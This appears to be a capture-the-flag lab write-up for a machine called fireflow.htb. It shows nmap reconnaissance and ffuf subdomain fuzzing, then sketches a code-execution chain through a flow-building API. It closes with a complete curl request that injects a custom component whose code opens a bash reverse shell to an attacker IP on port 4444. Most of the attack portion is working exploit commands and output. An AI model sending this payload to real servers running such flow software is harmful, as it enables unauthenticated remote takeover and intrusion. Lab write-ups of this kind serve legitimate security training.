

```

nmap -sV -A 10.129.244.214 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-17 15:08 -0400
Nmap scan report for 10.129.244.214
Host is up (0.19s latency).
Not shown: 992 closed tcp ports (reset)
PORT      STATE    SERVICE   VERSION
22/tcp    open     ssh       OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
443/tcp   open     ssl/http  nginx
|_http-title: Did not follow redirect to https://fireflow.htb/
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=fireflow.htb/organizationName=Task Force Nightfall/countryName=US
| Subject Alternative Name: DNS:fireflow.htb, DNS:*.fireflow.htb
| Not valid before: 2026-04-14T16:35:31
|_Not valid after:  2028-07-17T16:35:31
9100/tcp  filtered jetdirect
30000/tcp filtered ndmps
30718/tcp filtered unknown
30951/tcp filtered unknown
31038/tcp filtered unknown
31337/tcp filtered Elite
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   185.35 ms 10.10.14.1
2   186.19 ms 10.129.244.214

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.67 seconds

```


ffuf -u https://fireflow.htb:443 \ -H "HOST: FUZZ.fireflow.htb" \ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \ -fs 162

```

ffuf -u https://fireflow.htb:443 \
  -H "HOST: FUZZ.fireflow.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -fs 162

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://fireflow.htb:443
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.fireflow.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 162
________________________________________________

flow                    [Status: 200, Size: 1142, Words: 132, Lines: 25, Duration: 198ms]
[WARN] Caught keyboard interrupt (Ctrl-C)


```


![[Pasted image 20260718013553.png]]

![[Pasted image 20260718013620.png]]

![[Pasted image 20260718013646.png]]


```
plaintext
https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25


```

***The code execution chain is:***




```
Attacker JSON → Graph.from_payload() → vertex.instantiate_component() → eval_custom_component_code() → prepare_global_scope() → exec(compiled_code, exec_globals) ← arbitrary code execution
```



curl -sk -X POST \ 'https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow' \ -H 'Content-Type: application/json' \ -b 'client_id=41260873-a4fc-4f30-9380-0a7daa71aa05' \ -d '{ "data": { "nodes": [{ "id": "Evil", "type": "genericNode", "position": {"x":0,"y":0}, "data": { "id": "Evil", "type": "EvilComp", "node": { "template": { "code": { "type": "code", "required": true, "show": true, "multiline": true, "value": "import os\n\n_x = os.system(\"bash -c '\''bash -i >& /dev/tcp/10.10.14.92/4444 0>&1'\''\")\n\nfrom lfx.custom.custom_component.component import Component\nfrom lfx.io import Output\nfrom lfx.schema.data import Data\n\nclass EvilComp(Component):\n display_name=\"Evil-X\"\n outputs=[Output(display_name=\"O\",name=\"o\",method=\"r\")]\n def r(self)->Data:\n return Data(data={})", "name": "code", "password": false, "advanced": false, "dynamic": false }, "_type": "Component" }, "description": "Evil-X", "base_classes": ["Data"], "display_name": "EvilComp", "name": "EvilComp", "frozen": false, "outputs": [{"types":["Data"],"selected":"Data","name":"o","display_name":"O","method":"r","value":"UNDEFINED","cache":true,"allows_loop":false,"tool_mode":false,"hidden":null,"required_inputs":null,"group_outputs":false}], "field_order": ["code"], "beta": false, "edited": false } } }], "edges": [] } }'

7d84d636-af65-42e4-ac38-26e867052c25

https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25

